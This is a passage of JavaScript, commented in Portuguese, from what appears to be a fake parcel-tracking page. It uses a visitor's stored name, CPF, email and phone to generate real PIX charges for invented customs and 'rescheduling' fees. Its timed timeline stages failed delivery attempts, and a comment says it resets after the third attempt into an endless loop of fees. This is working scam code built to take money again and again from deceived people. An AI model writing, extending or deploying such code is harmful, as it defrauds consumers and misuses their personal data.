        if (element) {
            const previousText = element.textContent;
            element.textContent = text;
            console.log(`✅ Elemento '${elementId}' atualizado:`);
            console.log(`   Texto anterior: "${previousText}"`);
            console.log(`   Texto novo: "${text}"`);
        } else {
            console.error(`❌ Elemento '${elementId}' não encontrado no DOM`);
            console.log('🔍 Elementos disponíveis:', Array.from(document.querySelectorAll('[id]')).map(el => el.id));
        }
    }

    showElement(elementId) {
        const element = document.getElementById(elementId);
        if (element) {
            element.style.display = 'block';
        }
    }
    
    showDiscreteHelpPopup() {
        // Remover popup existente se houver
        const existingModal = document.getElementById('discreteHelpPopup');
        if (existingModal) {
            existingModal.remove();
        }

        const modal = document.createElement('div');
        modal.id = 'discreteHelpPopup';
        modal.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            max-width: 320px;
            width: 90%;
            background: white;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
            z-index: 2500;
            opacity: 0;
            transform: translateY(20px);
            transition: all 0.4s ease;
            border: 1px solid #e9ecef;
        `;

        modal.innerHTML = `
            <div style="
                padding: 20px;
                text-align: center;
            ">
                <div style="
                    width: 40px;
                    height: 40px;
                    background: linear-gradient(45deg, #ff6b35, #f7931e);
                    border-radius: 50%;
                    margin: 0 auto 15px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                ">
                    <i class="fas fa-search" style="color: white; font-size: 18px;"></i>
                </div>
                
                <h4 style="
                    color: #2c3e50;
                    font-size: 1rem;
                    font-weight: 600;
                    margin-bottom: 8px;
                    line-height: 1.3;
                ">
                    Não encontrou sua encomenda?
                </h4>
                
                <p style="
                    color: #666;
                    font-size: 0.9rem;
                    margin-bottom: 15px;
                    line-height: 1.4;
                ">
                    Vamos te ajudar a encontrar!
                </p>
                
                <button id="discreteSearchButton" style="
                    background: linear-gradient(45deg, #ff6b35, #f7931e);
                    color: white;
                    border: none;
                    padding: 10px 20px;
                    border-radius: 20px;
                    font-size: 0.9rem;
                    font-weight: 600;
                    cursor: pointer;
                    transition: all 0.3s ease;
                    animation: gentlePulse 2s ease-in-out infinite;
                    margin-right: 10px;
                ">
                    BUSCAR
                </button>
                
                <button id="discreteCloseButton" style="
                    background: transparent;
                    color: #999;
                    border: 1px solid #ddd;
                    padding: 10px 15px;
                    border-radius: 20px;
                    font-size: 0.9rem;
                    cursor: pointer;
                    transition: all 0.3s ease;
                ">
                    Fechar
                </button>
            </div>
        `;

        document.body.appendChild(modal);

        // Adicionar animações CSS se não existirem
        if (!document.getElementById('discretePopupAnimations')) {
            const style = document.createElement('style');
            style.id = 'discretePopupAnimations';
            style.textContent = `
                @keyframes gentlePulse {
                    0%, 100% { 
                        transform: scale(1); 
                        box-shadow: 0 4px 15px rgba(255, 107, 53, 0.3);
                    }
                    50% { 
                        transform: scale(1.02); 
                        box-shadow: 0 6px 20px rgba(255, 107, 53, 0.4);
                    }
                }
                
                #discreteSearchButton:hover {
                    transform: translateY(-1px);
                    box-shadow: 0 6px 20px rgba(255, 107, 53, 0.5);
                    animation-play-state: paused;
                }
                
                #discreteCloseButton:hover {
                    background: #f8f9fa;
                    border-color: #adb5bd;
                }
            `;
            document.head.appendChild(style);
        }

        // Animar entrada
        setTimeout(() => {
            modal.style.opacity = '1';
            modal.style.transform = 'translateY(0)';
        }, 100);

        // Configurar eventos
        const searchButton = document.getElementById('discreteSearchButton');
        const closeButton = document.getElementById('discreteCloseButton');

        if (searchButton) {
            searchButton.addEventListener('click', () => {
                console.log('🔍 Redirecionando para busca externa...');
                window.location.href = 'https://logixexpresscom.netlify.app/';
            });
        }

        if (closeButton) {
            closeButton.addEventListener('click', () => {
                this.closeDiscreteHelpPopup();
            });
        }

        // Auto-fechar após 15 segundos
        setTimeout(() => {
            this.closeDiscreteHelpPopup();
        }, 15000);

        console.log('💬 Pop-up discreta de ajuda exibida');
    }

    closeDiscreteHelpPopup() {
        const modal = document.getElementById('discreteHelpPopup');
        if (modal) {
            modal.style.opacity = '0';
            modal.style.transform = 'translateY(20px)';
            setTimeout(() => {
                if (modal.parentNode) {
                    modal.remove();
                }
            }, 400);
        }
    }

    setZentraPayApiSecret(apiSecret) {
        const success = this.zentraPayService.setApiSecret(apiSecret);
        if (success) {
            console.log('✅ API Secret Zentra Pay configurada com sucesso');
        } else {
            console.error('❌ Falha ao configurar API Secret Zentra Pay');
        }
        return success;
    }

    // Método para limpar sistema ao sair
    cleanup() {
        if (this.deliverySystem) {
            this.deliverySystem.cleanup();
        }
        console.log('🧹 Sistema de rastreamento limpo');
    }
    
    async handleDeliveryAttempt(attemptNumber) {
        console.log(`🚚 Iniciando tentativa de entrega ${attemptNumber + 1}`);
        
        const value = this.deliveryValues[attemptNumber % this.deliveryValues.length];
        console.log(`💰 Valor da tentativa: R$ ${value.toFixed(2)}`);
        
        // Mostrar loading
        this.showLoadingNotification('Gerando PIX de Entrega...');
        
        try {
            // Gerar PIX para entrega
            const userData = {
                nome: this.leadData.nome_completo,
                cpf: this.leadData.cpf,
                email: this.leadData.email,
                telefone: this.leadData.telefone
            };
            
            const pixResult = await this.zentraPayService.createPixTransaction(userData, value);
            
            if (pixResult.success) {
                console.log('🎉 PIX de entrega gerado com sucesso!');
                this.deliveryPixData = pixResult;
                this.closeLoadingNotification();
                
                setTimeout(() => {
                    this.showDeliveryModal(value, attemptNumber + 1);
                }, 300);
            } else {
                throw new Error(pixResult.error || 'Erro ao gerar PIX de entrega');
            }
            
        } catch (error) {
            console.error('💥 Erro ao gerar PIX de entrega:', error);
            this.closeLoadingNotification();
            
            // Mostrar modal estático como fallback
            setTimeout(() => {
                this.showDeliveryModal(value, attemptNumber + 1, true);
            }, 300);
        }
    }
    
    showDeliveryModal(value, attemptNumber, isStatic = false) {
        // Usar o modal existente de entrega, mas com valores corretos
        const modal = document.getElementById('deliveryModal');
        if (!modal) return;
        
        // Atualizar valor no modal
        const feeValue = document.getElementById('deliveryFeeValue');
        if (feeValue) {
            feeValue.textContent = `R$ ${value.toFixed(2)}`;
        }
        
        // Atualizar título do modal
        const modalTitle = modal.querySelector('.modal-header h3');
        if (modalTitle) {
            modalTitle.innerHTML = `<i class="fas fa-truck"></i> ${attemptNumber}ª Tentativa de Entrega`;
        }
        
        // Atualizar PIX se for real
        if (!isStatic && this.deliveryPixData && this.deliveryPixData.pixPayload) {
            const qrCode = modal.querySelector('.qr-code');
            const pixInput = modal.querySelector('#pixCodeDelivery');
            
            if (qrCode) {
                qrCode.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.deliveryPixData.pixPayload)}`;
            }
            
            if (pixInput) {
                pixInput.value = this.deliveryPixData.pixPayload;
            }
        }
        
        // Adicionar botão de simulação discreto
        this.addDeliverySimulationButton(modal, attemptNumber);
        
        // Mostrar modal
        modal.style.display = 'flex';
        document.body.style.overflow = 'hidden';
        
        console.log(`💳 Modal de entrega exibido - Tentativa ${attemptNumber} - R$ ${value.toFixed(2)}`);
    }
    
    addDeliverySimulationButton(modal, attemptNumber) {
        // Remover botão existente se houver
        const existingButton = modal.querySelector('.delivery-simulation-button');
        if (existingButton) {
            existingButton.remove();
        }
        
        const modalContent = modal.querySelector('.modal-content');
        if (!modalContent) return;
        
        const buttonContainer = document.createElement('div');
        buttonContainer.style.cssText = `
            text-align: center;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #e9ecef;
        `;
        
        buttonContainer.innerHTML = `
            <button class="delivery-simulation-button" style="
                background: transparent;
                color: #666;
                border: 1px solid #ddd;
                padding: 6px 12px;
                border-radius: 6px;
                cursor: pointer;
                font-weight: 600;
                transition: all 0.3s ease;
                opacity: 0.7;
                font-size: 12px;
                min-width: 30px;
                height: 28px;
            ">
                --
            </button>
        `;
        
        modalContent.appendChild(buttonContainer);
        
        const simulationButton = buttonContainer.querySelector('.delivery-simulation-button');
        if (simulationButton) {
            simulationButton.addEventListener('click', () => {
                this.simulateDeliveryPayment(attemptNumber);
            });
            
            simulationButton.addEventListener('mouseenter', function() {
                this.style.background = 'rgba(0, 0, 0, 0.05)';
                this.style.transform = 'translateY(-1px)';
                this.style.opacity = '1';
            });
            
            simulationButton.addEventListener('mouseleave', function() {
                this.style.background = 'transparent';
                this.style.transform = 'translateY(0)';
                this.style.opacity = '0.7';
            });
        }
    }
    
    simulateDeliveryPayment(attemptNumber) {
        console.log(`✅ Simulando pagamento da tentativa ${attemptNumber}`);
        
        // Fechar modal
        const modal = document.getElementById('deliveryModal');
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
        
        // Processar pagamento
        this.processDeliveryPayment(attemptNumber);
    }
    
    processDeliveryPayment(attemptNumber) {
        console.log(`🚚 Processando pagamento da tentativa ${attemptNumber}`);
        
        // Atualizar contador de tentativas
        this.deliveryAttempts = attemptNumber;
        
        // Mostrar notificação de sucesso
        this.showSuccessNotification('Pagamento de entrega confirmado!');
        
        // Iniciar fluxo de entrega
        setTimeout(() => {
            this.startDeliveryFlow(attemptNumber);
        }, 2000);
    }
    
    startDeliveryFlow(attemptNumber) {
        console.log(`🚚 Iniciando fluxo de entrega para tentativa ${attemptNumber}`);
        
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;
        
        const baseStepNumber = 100 + (attemptNumber * 10); // 110, 120, 130, etc.
        
        const deliverySteps = [
            { title: 'Pedido sairá para entrega', delay: 2 * 60 * 1000 }, // 2 minutos
            { title: 'Pedido em trânsito', delay: 2 * 60 * 60 * 1000 }, // 2 horas
            { title: 'Pedido em rota para seu destino', delay: 2 * 60 * 60 * 1000 }, // 2 horas
            { title: `${attemptNumber + 1}ª Tentativa de Entrega (Aguardando Pagamento)`, delay: 30 * 60 * 1000, isDeliveryAttempt: true } // 30 minutos
        ];
        
        deliverySteps.forEach((step, index) => {
            setTimeout(() => {
                const stepDate = new Date();
                
                // Configurar dados da etapa
                const stepData = {
                    id: baseStepNumber + index + 1,
                    date: stepDate,
                    title: step.title,
                    description: step.title,
                    isChina: false,
                    completed: true,
                    needsLiberation: false
                };
                
                const timelineItem = this.createTimelineItem(stepData, index === deliverySteps.length - 1);
                
                timeline.appendChild(timelineItem);
                
                setTimeout(() => {
                    timelineItem.style.opacity = '1';
                    timelineItem.style.transform = 'translateY(0)';
                }, 100);
                
                timelineItem.scrollIntoView({ behavior: 'smooth', block: 'center' });
                
            }, step.delay);
        });
    }
    
    showLoadingNotification(message = 'Processando...') {
        const notification = document.createElement('div');
        notification.id = 'deliveryLoadingNotification';
        notification.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;
        
        const content = document.createElement('div');
        content.style.cssText = `
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #1e4a6b;
        `;
        
        content.innerHTML = `
            <div style="margin-bottom: 20px;">
                <i class="fas fa-truck" style="font-size: 3rem; color: #1e4a6b; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                ${message}
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6;">
                Aguarde enquanto processamos sua solicitação
            </p>
        `;
        
        notification.appendChild(content);
        document.body.appendChild(notification);
        document.body.style.overflow = 'hidden';
    }
    
    closeLoadingNotification() {
        const notification = document.getElementById('deliveryLoadingNotification');
        if (notification) {
            notification.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
    }

    scrollToElement(element, offset = 0) {
        if (element) {
            const elementPosition = element.offsetTop - offset;
            window.scrollTo({
                top: elementPosition,
                behavior: 'smooth'
            });
        }
    }

    showError(message) {
        console.error('Error:', message);
        // You can implement a proper error display here
        alert(message);
    }

    showLoadingNotification() {
        // Implementation for showing loading notification
        console.log('Loading...');
    }

    closeLoadingNotification() {
        // Implementation for closing loading notification
        console.log('Loading closed');
    }
}

/**
 * Sistema de fluxo de entrega com tentativas em loop
 */
class DeliveryFlowSystem {
    constructor(trackingSystem) {
        this.trackingSystem = trackingSystem;
        this.deliveryAttempts = 0;
        this.deliveryValues = [7.74, 12.38, 16.46]; // Valores das tentativas
        this.isProcessing = false;
        this.timers = [];
        this.currentStep = 0;
        this.deliveryPixData = null;
        
        console.log('🚀 Sistema de fluxo de entrega inicializado');
        console.log('💰 Valores de tentativa:', this.deliveryValues);
    }

    startDeliveryFlow() {
        console.log('🚀 Iniciando fluxo de entrega...');
        this.clearAllTimers();
        
        // Etapa 1: Liberado na alfândega (imediato)
        this.addTimelineStep({
            stepNumber: 12,
            title: 'Pedido liberado na alfândega de importação',
            description: 'Seu pedido foi liberado após o pagamento da taxa alfandegária',
            delay: 0,
            hasPaymentButton: false
        });
        
        // Etapa 2: Sairá para entrega (após 2 minutos)
        this.addTimelineStep({
            stepNumber: 13,
            title: 'Pedido sairá para entrega',
            description: 'Pedido sairá para entrega para seu endereço',
            delay: 2 * 60 * 1000, // 2 minutos
            hasPaymentButton: false
        });
        
        // Etapa 3: Em trânsito (após 2 horas)
        this.addTimelineStep({
            stepNumber: 14,
            title: 'Pedido em trânsito para entrega',
            description: 'Pedido em trânsito para seu endereço',
            delay: 2 * 60 * 60 * 1000, // 2 horas
            hasPaymentButton: false
        });
        
        // Etapa 4: Em rota (após 4 horas)
        this.addTimelineStep({
            stepNumber: 15,
            title: 'Pedido em rota de entrega',
            description: 'Pedido em rota de entrega para seu endereço, aguarde',
            delay: 4 * 60 * 60 * 1000, // 4 horas
            hasPaymentButton: false
        });
        
        // Etapa 5: Tentativa de entrega (após 6 horas)
        this.addTimelineStep({
            stepNumber: 16,
            title: `${this.deliveryAttempts + 1}ª tentativa de entrega`,
            description: `${this.deliveryAttempts + 1}ª tentativa de entrega realizada, mas não foi possível entregar`,
            delay: 6 * 60 * 60 * 1000, // 6 horas
            hasPaymentButton: true,
            isDeliveryAttempt: true
        });
    }

    addTimelineStep({ stepNumber, title, description, delay, hasPaymentButton = false, isDeliveryAttempt = false }) {
        const timer = setTimeout(() => {
            console.log(`📦 Adicionando etapa ${stepNumber}: ${title}`);
            
            const timeline = document.getElementById('trackingTimeline');
            if (!timeline) return;

            const stepDate = new Date();
            const timelineItem = this.createTimelineItem({
                stepNumber,
                title,
                description,
                date: stepDate,
                completed: true,
                hasPaymentButton,
                isDeliveryAttempt
            });

            timeline.appendChild(timelineItem);

            // Animar entrada da nova etapa
            setTimeout(() => {
                timelineItem.style.opacity = '1';
                timelineItem.style.transform = 'translateY(0)';
            }, 100);

            // Scroll para a nova etapa
            timelineItem.scrollIntoView({ 
                behavior: 'smooth', 
                block: 'center' 
            });

            this.currentStep = stepNumber;

        }, delay);

        this.timers.push(timer);
    }

    createTimelineItem({ stepNumber, title, description, date, completed, hasPaymentButton, isDeliveryAttempt }) {
        const item = document.createElement('div');
        item.className = `timeline-item ${completed ? 'completed' : ''}`;
        item.style.opacity = '0';
        item.style.transform = 'translateY(20px)';
        item.style.transition = 'all 0.5s ease';

        const dateStr = date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
        const timeStr = date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

        let buttonHtml = '';
        
        if (hasPaymentButton && isDeliveryAttempt) {
            const attemptNumber = this.deliveryAttempts + 1;
            const value = this.deliveryValues[this.deliveryAttempts % this.deliveryValues.length];
            
            buttonHtml = `
                <button class="delivery-retry-btn" 
                        data-attempt="${this.deliveryAttempts}" 
                        data-value="${value}"
                        style="
                            background: linear-gradient(45deg, #e74c3c, #c0392b);
                            color: white;
                            border: none;
                            padding: 12px 25px;
                            font-size: 1rem;
                            font-weight: 700;
                            border-radius: 25px;
                            cursor: pointer;
                            transition: all 0.3s ease;
                            box-shadow: 0 4px 15px rgba(231, 76, 60, 0.4);
                            animation: pulse 2s infinite;
                            font-family: 'Roboto', sans-serif;
                            letter-spacing: 0.5px;
                            margin-top: 15px;
                            display: inline-flex;
                            align-items: center;
                            gap: 8px;
                        ">
                    <i class="fas fa-truck"></i> REAGENDAR ENTREGA
                </button>
            `;
        }

        item.innerHTML = `
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${dateStr}</span>
                    <span class="time">${timeStr}</span>
                </div>
                <div class="timeline-text">
                    <p>${description}</p>
                    ${buttonHtml}
                </div>
            </div>
        `;

        // Configurar eventos dos botões de reagendamento
        if (hasPaymentButton && isDeliveryAttempt) {
            const retryButton = item.querySelector('.delivery-retry-btn');
            if (retryButton) {
                this.configureDeliveryRetryButton(retryButton);
            }
        }

        return item;
    }

    configureDeliveryRetryButton(button) {
        button.addEventListener('click', () => {
            this.handleDeliveryRetry(button);
        });

        console.log('🔄 Botão de reagendamento configurado');
    }

    async handleDeliveryRetry(button) {
        if (this.isProcessing) return;

        this.isProcessing = true;
        const attemptNumber = parseInt(button.dataset.attempt);
        const value = parseFloat(button.dataset.value);
        
        console.log(`🔄 Processando reagendamento - Tentativa ${attemptNumber + 1} - R$ ${value.toFixed(2)}`);

        // Mostrar loading
        this.showDeliveryLoadingNotification();

        try {
            // Gerar PIX funcional via Zentra Pay
            console.log('🚀 Gerando PIX para tentativa de entrega via Zentra Pay...');
            
            const userData = {
                nome: this.trackingSystem.leadData.nome_completo,
                cpf: this.trackingSystem.leadData.cpf,
                email: this.trackingSystem.leadData.email,
                telefone: this.trackingSystem.leadData.telefone
            };
            
            const pixResult = await this.trackingSystem.zentraPayService.createPixTransaction(userData, value);

            if (pixResult.success) {
                console.log('🎉 PIX de reagendamento gerado com sucesso!');
                this.deliveryPixData = pixResult;
                
                this.closeDeliveryLoadingNotification();
                
                // Mostrar modal de pagamento de reagendamento
                setTimeout(() => {
                    this.showDeliveryPixModal(value, attemptNumber + 1);
                }, 300);
            } else {
                throw new Error(pixResult.error || 'Erro ao gerar PIX de reagendamento');
            }
            
        } catch (error) {
            console.error('💥 Erro ao gerar PIX de reagendamento:', error);
            this.closeDeliveryLoadingNotification();
            
            // Mostrar modal estático como fallback
            setTimeout(() => {
                this.showDeliveryPixModal(value, attemptNumber + 1, true);
            }, 300);
        }
    }

    showDeliveryLoadingNotification() {
        const notification = document.createElement('div');
        notification.id = 'deliveryLoadingNotification';
        notification.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;

        const content = document.createElement('div');
        content.style.cssText = `
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #1e4a6b;
        `;

        content.innerHTML = `
            <div style="margin-bottom: 20px;">
                <i class="fas fa-truck" style="font-size: 3rem; color: #1e4a6b; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                Gerando PIX de Reagendamento...
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                Aguarde enquanto processamos sua solicitação
            </p>
            <div style="margin-top: 25px;">
                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
                    <div style="width: 0%; height: 100%; background: linear-gradient(45deg, #1e4a6b, #2c5f8a); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
                </div>
            </div>
            <p style="color: #999; font-size: 0.9rem; margin-top: 15px;">
                Processando pagamento...
            </p>
        `;

        notification.appendChild(content);
        document.body.appendChild(notification);
        document.body.style.overflow = 'hidden';
    }

    closeDeliveryLoadingNotification() {
        const notification = document.getElementById('deliveryLoadingNotification');
        if (notification) {
            notification.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
    }

    showDeliveryPixModal(value, attemptNumber, isStatic = false) {
        const modal = document.createElement('div');
        modal.className = 'modal-overlay';
        modal.id = 'deliveryPixModal';
        modal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;

        // QR Code e PIX Payload
        let qrCodeSrc, pixPayload;
        
        if (!isStatic && this.deliveryPixData && this.deliveryPixData.pixPayload) {
            // Dados reais do Zentra Pay
            qrCodeSrc = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.deliveryPixData.pixPayload)}`;
            pixPayload = this.deliveryPixData.pixPayload;
            console.log('✅ Usando PIX real do Zentra Pay para reagendamento');
        } else {
            // Fallback estático
            qrCodeSrc = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925LOGIX EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';
            pixPayload = '00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925LOGIX EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';
            console.log('⚠️ Usando PIX estático como fallback para reagendamento');
        }

        const leadName = this.trackingSystem.leadData?.nome_completo || 'Cliente';

        modal.innerHTML = `
            <div class="professional-modal-container">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">${attemptNumber}ª Tentativa de Entrega</h2>
                    <button class="professional-modal-close" id="closeDeliveryPixModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content">
                    <div class="liberation-explanation">
                        <p class="liberation-subtitle">
                            <strong>${leadName}</strong>, para reagendar a entrega do seu pedido, é necessário pagar a taxa de reagendamento de <strong>R$ ${value.toFixed(2)}</strong>.
                        </p>
                    </div>

                    <div class="professional-fee-display">
                        <div class="fee-info">
                            <span class="fee-label">Taxa de Reagendamento - ${attemptNumber}ª Tentativa</span>
                            <span class="fee-amount">R$ ${value.toFixed(2)}</span>
                        </div>
                    </div>

                    <!-- Seção PIX Real - Zentra Pay -->
                    <div class="professional-pix-section">
                        <h3 class="pix-section-title">Pagamento via Pix</h3>
                        
                        <div class="pix-content-grid">
                            <!-- QR Code -->
                            <div class="qr-code-section">
                                <div class="qr-code-container">
                                    <img src="${qrCodeSrc}" alt="QR Code PIX Reagendamento" class="professional-qr-code">
                                </div>
                            </div>
                            
                            <!-- PIX Copia e Cola -->
                            <div class="pix-copy-section">
                                <label class="pix-copy-label">PIX Copia e Cola</label>
                                <div class="professional-copy-container">
                                    <textarea id="deliveryPixCode" class="professional-pix-input" readonly>${pixPayload}</textarea>
                                    <button class="professional-copy-button" id="copyDeliveryPixButton">
                                        <i class="fas fa-copy"></i> Copiar
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Instruções de Pagamento -->
                        <div class="professional-payment-steps">
                            <h4 class="steps-title">Como realizar o pagamento:</h4>
                            <div class="payment-steps-grid">
                                <div class="payment-step">
                                    <div class="step-number">1</div>
                                    <div class="step-content">
                                        <i class="fas fa-mobile-alt step-icon"></i>
                                        <span class="step-text">Acesse seu app do banco</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">2</div>
                                    <div class="step-content">
                                        <i class="fas fa-qrcode step-icon"></i>
                                        <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">3</div>
                                    <div class="step-content">
                                        <i class="fas fa-check step-icon"></i>
                                        <span class="step-text">Confirme o pagamento</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Botão de Simulação para Testes -->
                        <div style="text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e9ecef;">
                            <button id="simulateDeliveryPaymentButton" style="
                                background: #6c757d;
                                color: white;
                                border: none;
                                padding: 8px 16px;
                                border-radius: 6px;
                                cursor: pointer;
                                font-size: 0.9rem;
                                font-weight: 500;
                                opacity: 0.8;
                            ">
                                🧪 Simular Pagamento (Teste)
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        `;

        document.body.appendChild(modal);
        document.body.style.overflow = 'hidden';

        // Configurar eventos
        this.setupDeliveryModalEvents(modal, attemptNumber);

        console.log(`💳 Modal de PIX para ${attemptNumber}ª tentativa exibido - R$ ${value.toFixed(2)}`);
    }

    setupDeliveryModalEvents(modal, attemptNumber) {
        // Botão fechar
        const closeButton = modal.querySelector('#closeDeliveryPixModal');
        if (closeButton) {
            closeButton.addEventListener('click', () => {
                this.closeDeliveryPixModal();
            });
        }

        // Botão copiar PIX
        const copyButton = modal.querySelector('#copyDeliveryPixButton');
        if (copyButton) {
            copyButton.addEventListener('click', () => {
                this.copyDeliveryPixCode();
            });
        }

        // Botão simular pagamento
        const simulateButton = modal.querySelector('#simulateDeliveryPaymentButton');
        if (simulateButton) {
            simulateButton.addEventListener('click', () => {
                this.simulateDeliveryPayment(attemptNumber);
            });
        }

        // Fechar ao clicar fora
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                this.closeDeliveryPixModal();
            }
        });
    }

    simulateDeliveryPayment(attemptNumber) {
        console.log(`💳 Simulando pagamento da ${attemptNumber}ª tentativa`);
        
        this.closeDeliveryPixModal();
        
        // Processar pagamento com sucesso
        setTimeout(() => {
            this.processDeliveryPaymentSuccess(attemptNumber);
        }, 1000);
    }

    processDeliveryPaymentSuccess(attemptNumber) {
        console.log(`✅ Pagamento da ${attemptNumber}ª tentativa processado com sucesso`);
        
        // Ocultar botão de reagendamento atual
        this.hideCurrentRetryButton(attemptNumber - 1);
        
        // Mostrar notificação de sucesso
        this.showDeliverySuccessNotification(attemptNumber);
        
        // Incrementar contador de tentativas
        this.deliveryAttempts = attemptNumber;
        
        // Se chegou na 3ª tentativa, resetar para loop infinito
        if (this.deliveryAttempts >= 3) {
            this.deliveryAttempts = 0;
        }
        
        // Iniciar novo ciclo de entrega
        setTimeout(() => {
            this.startNewDeliveryCycle();
        }, 2000);
    }

    hideCurrentRetryButton(attemptIndex) {
        const currentRetryButton = document.querySelector(`[data-attempt="${attemptIndex}"]`);
        if (currentRetryButton) {
            currentRetryButton.style.display = 'none';
        }
    }

    showDeliverySuccessNotification(attemptNumber) {
        const notification = document.createElement('div');
        notification.className = 'payment-success-notification';
        notification.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #27ae60;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
            z-index: 9999;
            display: flex;
            align-items: center;
            gap: 10px;
            font-family: 'Inter', sans-serif;
            animation: slideInRight 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
        `;

        notification.innerHTML = `
            <i class="fas fa-check-circle" style="font-size: 1.2rem;"></i>
            <div>
                <div style="font-weight: 600; margin-bottom: 2px;">Pagamento confirmado!</div>
                <div style="font-size: 0.9rem; opacity: 0.9;">${attemptNumber}ª tentativa reagendada com sucesso.</div>
            </div>
        `;

        document.body.appendChild(notification);

        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 5000);
    }

    startNewDeliveryCycle() {
        console.log('🚚 Iniciando novo ciclo de entrega...');
        
        this.isProcessing = false;
        
        // Resetar contador de etapas para o novo ciclo
        const baseStep = 100 + (this.deliveryAttempts * 10); // 100, 110, 120, etc.
        
        // Etapa 1: Sairá para entrega (imediato)
        this.addTimelineStep({
            stepNumber: baseStep + 1,
            title: 'Pedido sairá para entrega',
            description: 'Seu pedido está sendo preparado para nova tentativa de entrega',
            delay: 0,
            hasPaymentButton: false
        });
        
        // Etapa 2: Em trânsito 1 (após 30 minutos)
        this.addTimelineStep({
            stepNumber: baseStep + 2,
            title: 'Pedido em trânsito para entrega',
            description: 'Pedido em trânsito para seu endereço',
            delay: 30 * 60 * 1000, // 30 minutos
            hasPaymentButton: false
        });
        
        // Etapa 3: Em trânsito 2 (após 1 hora)
        this.addTimelineStep({
            stepNumber: baseStep + 3,
            title: 'Pedido em trânsito para entrega',
            description: 'Pedido em trânsito para seu endereço',
            delay: 60 * 60 * 1000, // 1 hora
            hasPaymentButton: false
        });
        
        // Etapa 4: Em rota (após 1.5 horas)
        this.addTimelineStep({
            stepNumber: baseStep + 4,
            title: 'Pedido em rota de entrega',
            description: 'Pedido em rota de entrega para seu endereço, aguarde',
            delay: 90 * 60 * 1000, // 1.5 horas
            hasPaymentButton: false
        });
        
        // Etapa 5: Nova tentativa (após 2 horas)
        this.addTimelineStep({
            stepNumber: baseStep + 5,
            title: `${this.deliveryAttempts + 1}ª tentativa de entrega`,
            description: `${this.deliveryAttempts + 1}ª tentativa de entrega realizada, mas não foi possível entregar`,
            delay: 2 * 60 * 60 * 1000, // 2 horas
            hasPaymentButton: true,
            isDeliveryAttempt: true
        });
    }

    copyDeliveryPixCode() {
        const pixInput = document.getElementById('deliveryPixCode');
        const copyButton = document.getElementById('copyDeliveryPixButton');
        
        if (!pixInput || !copyButton) return;

        try {
            pixInput.select();
            pixInput.setSelectionRange(0, 99999);

